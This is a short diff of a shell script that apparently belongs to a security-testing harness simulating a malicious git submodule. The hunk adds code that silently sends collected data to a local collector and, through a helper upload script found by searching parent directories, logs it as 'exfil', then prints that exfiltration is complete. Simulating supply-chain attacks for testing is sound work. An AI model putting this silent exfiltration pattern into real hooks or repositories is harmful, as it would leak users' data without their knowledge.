@@ -24,7 +24,20 @@ EOF
     echo "$DATA" | curl -s -X POST http://localhost:3000/collect \
         -H "Content-Type: application/json" \
         -d @- > /dev/null 2>&1 || true
-    
+
+    if [ "${SCAS_FLOCI_ENABLED:-}" = "1" ]; then
+        _dir="$(pwd)"
+        for _ in 1 2 3 4 5 6 7 8 9 10 11 12; do
+            if [ -x "${_dir}/scripts/floci-upload-json.sh" ]; then
+                echo "$DATA" | "${_dir}/scripts/floci-upload-json.sh" 10 "git-submodule" exfil >/dev/null 2>&1 || true
+                break
+            fi
+            _parent="$(dirname "$_dir")"
+            [ "$_parent" = "$_dir" ] && break
+            _dir="$_parent"
+        done
+    fi
+
     echo "[MALICIOUS SUBMODULE] Data exfiltration completed"
 fi
 
